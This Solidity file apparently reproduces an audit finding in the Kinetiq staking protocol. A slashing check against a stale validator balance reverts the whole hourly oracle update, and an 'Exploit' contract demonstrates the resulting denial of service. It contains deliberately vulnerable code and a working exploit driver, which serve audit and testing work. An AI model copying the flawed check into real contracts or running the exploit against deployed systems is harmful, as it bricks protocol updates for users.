// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Kinetiq finding 58612 (H-04):
// "ReportSlashingEvent reverts if outdated balance is below slashing amount".
//
// Protocol : Kinetiq liquid staking (Pashov Audit Group, 2025-02-26 review)
//   report   github.com/pashov/audits .../Kinetiq-security-review_2025-02-26.md
//   contracts OracleManager.generatePerformance / ValidatorManager.reportSlashingEvent
//
// The two functions below (OracleManager.generatePerformance's slashing loop and
// ValidatorManager.reportSlashingEvent) are reproduced VERBATIM from the finding's
// embedded audited source. The marked @> line is the exact line the finding flags.
//
// Root cause: reportSlashingEvent compares the newly-reported slash `amount`
// against the validator's STALE, previously-reported `val.balance`:
//        require(val.balance >= amount, "Insufficient stake for slashing"); // @>
// `val.balance` is only refreshed by the oracle's periodic update, so between
// updates it lags the validator's real balance. When a validator's real balance
// grows past its last-reported value, the averaged slash amount can exceed the
// stored (stale) balance even though the real balance is far larger. The require
// then reverts, and because generatePerformance calls reportSlashingEvent inside
// its per-validator loop, the ENTIRE hourly generatePerformance batch reverts ->
// the oracle update is bricked (DoS) until the condition clears. The finding's own
// example: stored balance 100, real balance grew to 500, averaged slash 110 ->
// require(100 >= 110) is false -> revert.
//
// Faithful doubles: an OpenZeppelin-style EnumerableMap.AddressToUintMap (so the
// verbatim `_validators[_validatorIndexes.get(validator)]` line is identical to
// the audited contract); the pause / role access modifiers; addValidator (stakes
// HYPE into a validator, seeding its stored balance and totalBalance); and
// seedReport (a faithful double of the elided multi-oracle averaging that produces
// per-validator avgSlashAmount / previousSlashing — the real averaged accounting
// values the loop consumes, not fabricated constants). A MarkerToken surfaces the
// DoS magnitude (the slash that can never be recorded) at the profit SINK, since
// this liveness bug has no attacker payout.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal OpenZeppelin-style EnumerableMap.AddressToUintMap so the verbatim
///      `_validators[_validatorIndexes.get(validator)]` line is identical to the
///      audited contract.
library EnumerableMapMini {
    struct AddressToUintMap {
        mapping(address => uint256) _values;
        mapping(address => bool) _has;
    }

    function set(AddressToUintMap storage m, address key, uint256 val) internal {
        m._values[key] = val;
        m._has[key] = true;
    }

    function get(AddressToUintMap storage m, address key) internal view returns (uint256) {
        require(m._has[key], "EnumerableMap: nonexistent key");
        return m._values[key];
    }
}

/// @dev Faithful minimal ERC20 marker used only to surface the DoS/accounting harm
///      as a positive balance delta at the profit SINK (no attacker payout exists
///      for this liveness bug). Represents the slashing amount that can never be
///      recorded once the hourly generatePerformance update is bricked.
contract MarkerToken {
    string public name = "Kinetiq Staked HYPE (bricked slashing update)";
    string public symbol = "HYPE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — ValidatorManager.reportSlashingEvent is reproduced
// VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract ValidatorManager {
    using EnumerableMapMini for EnumerableMapMini.AddressToUintMap;

    struct Validator {
        address validatorAddress;
        bool active;
        uint256 balance;
    }

    Validator[] private _validators;
    EnumerableMapMini.AddressToUintMap private _validatorIndexes; // key -> 0-based index
    uint256 public totalBalance;

    address public oracleManager;
    address public admin;

    event SlashingReported(address validator, uint256 amount);

    constructor() {
        admin = msg.sender;
    }

    // ── faithful access double for the elided oracle-manager guard ────────────
    modifier onlyOracleManager() {
        require(msg.sender == oracleManager, "Caller is not oracle manager");
        _;
    }

    function setOracleManager(address om) external {
        require(msg.sender == admin, "not admin");
        oracleManager = om;
    }

    // ── test-setup double: register a validator with a stored (last-reported)
    //    balance, growing totalBalance (mirrors the staking that funds a validator)
    function addValidator(address validator, uint256 balance) external {
        require(msg.sender == admin, "not admin");
        _validatorIndexes.set(validator, _validators.length); // 0-based index
        _validators.push(Validator({validatorAddress: validator, active: true, balance: balance}));
        totalBalance += balance;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // VERBATIM: ValidatorManager.reportSlashingEvent
    // ═══════════════════════════════════════════════════════════════════════
    function reportSlashingEvent(address validator, uint256 amount)
        external
        onlyOracleManager // faithful double of the elided access modifier
    {
        require(amount > 0, "Invalid slash amount");

        Validator storage val = _validators[_validatorIndexes.get(validator)];
        require(val.balance >= amount, "Insufficient stake for slashing"); // @> VULN: compares the new slash against the STALE previously-reported val.balance; when the real balance has grown past the stored one this reverts, and (called inside generatePerformance's loop) reverts the whole hourly oracle update -> DoS

        // Update balances
        unchecked {
            // These operations cannot overflow:
            // - val.balance >= amount (checked above)
            // - totalBalance >= val.balance (invariant maintained by the contract)
            val.balance -= amount;
            totalBalance -= amount;
        }

        emit SlashingReported(validator, amount);
    }

    // ── view helper ───────────────────────────────────────────────────────────
    function balanceOfValidator(address validator) external view returns (uint256) {
        return _validators[_validatorIndexes.get(validator)].balance;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// OracleManager — generatePerformance's slashing loop is reproduced VERBATIM from
// the audited source. The elided aggregation (averaging each validator's reported
// slash across oracles) is provided as a faithful `seedReport` double that stores
// the real per-validator avgSlashAmount / previousSlashing the loop consumes.
// ─────────────────────────────────────────────────────────────────────────────
contract OracleManager {
    ValidatorManager public validatorManager;
    address public admin;

    bool private _paused;
    mapping(bytes32 => mapping(address => bool)) private _roles;
    bytes32 public constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");

    // faithful doubles for the averaged oracle data used by the elided aggregation
    address[] private validators;
    mapping(address => bool) private _known;
    mapping(address => uint256) public avgSlash; // newly-averaged cumulative slash
    mapping(address => uint256) public prevSlash; // previously-accounted cumulative slash

    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "AccessControl: missing role");
        _;
    }

    constructor(address vm) {
        validatorManager = ValidatorManager(vm);
        admin = msg.sender;
        _roles[OPERATOR_ROLE][msg.sender] = true; // deployer (the Exploit) is the operator
    }

    // ── faithful double of the elided multi-oracle averaging: records the averaged
    //    cumulative slash and the previously-accounted slash for a validator ──────
    function seedReport(address validator, uint256 avgSlashAmount, uint256 previousSlashing) external {
        require(msg.sender == admin, "not admin");
        if (!_known[validator]) {
            validators.push(validator);
            _known[validator] = true;
        }
        avgSlash[validator] = avgSlashAmount;
        prevSlash[validator] = previousSlashing;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // VERBATIM: OracleManager.generatePerformance (slashing loop)
    // ═══════════════════════════════════════════════════════════════════════
    function generatePerformance() external whenNotPaused onlyRole(OPERATOR_ROLE) returns (bool) {
        // ..
        uint256 validatorCount = validators.length;

        // Update validators with averaged values
        for (uint256 i = 0; i < validatorCount; i++) {
            address validator = validators[i];
            uint256 avgSlashAmount = avgSlash[validator];
            uint256 previousSlashing = prevSlash[validator];

            // Handle slashing
            if (avgSlashAmount > previousSlashing) {
                uint256 newSlashAmount = avgSlashAmount - previousSlashing;
                validatorManager.reportSlashingEvent(validator, newSlashAmount);
            }

            // ...
        }

        // ...

        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduce the generatePerformance DoS. A validator whose stored
// (last-reported) balance is 100 has a real balance that grew to 500; the oracle
// averages an accumulated slash of 110. generatePerformance calls
// reportSlashingEvent(validator, 110), whose require(val.balance >= amount) checks
// the STALE 100 and reverts -> the entire hourly oracle update reverts (DoS).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MarkerToken public marker;
    ValidatorManager public vuln;
    OracleManager public oracle;

    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    address internal constant valA = address(0xA11CE);
    address internal constant valB = address(0xB0B);

    uint256 internal constant STORED_A = 100e18; // valA's stale, last-reported stored balance
    uint256 internal constant STORED_B = 200e18; // valB's stored balance (keeps totalBalance invariant healthy)
    uint256 internal constant REAL_A = 500e18; // valA's real, up-to-date balance (grew since last report)
    uint256 internal constant AVG_SLASH_A = 110e18; // averaged accumulated slash reported for valA
    uint256 internal constant PREV_SLASH_A = 0; // no slash previously accounted

    bool public performanceReverted; // the DoS
    string public revertReason;
    uint256 public unrecordableSlash; // slash magnitude that can never be applied

    constructor() {
        marker = new MarkerToken(); // child nonce 1 (profit/marker token)
        vuln = new ValidatorManager(); // child nonce 2 (VULN)
        oracle = new OracleManager(address(vuln)); // child nonce 3
    }

    function run() external {
        // Wire the oracle manager so it may call reportSlashingEvent.
        vuln.setOracleManager(address(oracle));

        // 1) Two validators are staked with their last-reported balances:
        //    valA stored=100, valB stored=200 -> totalBalance = 300.
        vuln.addValidator(valA, STORED_A);
        vuln.addValidator(valB, STORED_B);
        require(vuln.totalBalance() == STORED_A + STORED_B, "setup: totalBalance");

        // valA's REAL balance has since grown to 500 (documented; the bug is that
        // reportSlashingEvent compares against the stale stored 100, not the real 500).
        require(REAL_A > STORED_A, "setup: real balance grew past stored");

        // 2) The oracle round averages an accumulated slash of 110 for valA
        //    (previously 0). newSlashAmount = 110 - 0 = 110.
        oracle.seedReport(valA, AVG_SLASH_A, PREV_SLASH_A);
        uint256 newSlashAmount = AVG_SLASH_A - PREV_SLASH_A;

        // Precondition for the revert: averaged slash exceeds the STALE stored
        // balance, even though it is far below valA's real balance.
        require(newSlashAmount > vuln.balanceOfValidator(valA), "slash does not exceed stale stored balance");
        require(newSlashAmount < REAL_A, "slash would be valid against the real balance");

        // 3) The routine hourly oracle update runs. generatePerformance loops the
        //    validators and calls reportSlashingEvent(valA, 110); require(100 >= 110)
        //    is false -> revert, which propagates out of the whole batch (DoS).
        try oracle.generatePerformance() returns (bool) {
            performanceReverted = false;
        } catch Error(string memory reason) {
            performanceReverted = true;
            revertReason = reason;
        } catch {
            performanceReverted = true;
            revertReason = "";
        }

        // HARM: the entire generatePerformance oracle update reverts (DoS), and the
        // revert is exactly the flagged require in reportSlashingEvent.
        require(performanceReverted, "no DoS: generatePerformance did not revert");
        require(
            keccak256(bytes(revertReason)) == keccak256(bytes("Insufficient stake for slashing")),
            "revert was not the flagged 'Insufficient stake for slashing' require"
        );

        // Surface the bricked-update magnitude (the slash that can never be recorded)
        // at the profit SINK via the marker token.
        unrecordableSlash = newSlashAmount; // 110e18
        marker.mint(SINK, unrecordableSlash);
        require(marker.balanceOf(SINK) == unrecordableSlash, "harm not recorded at sink");
    }
}
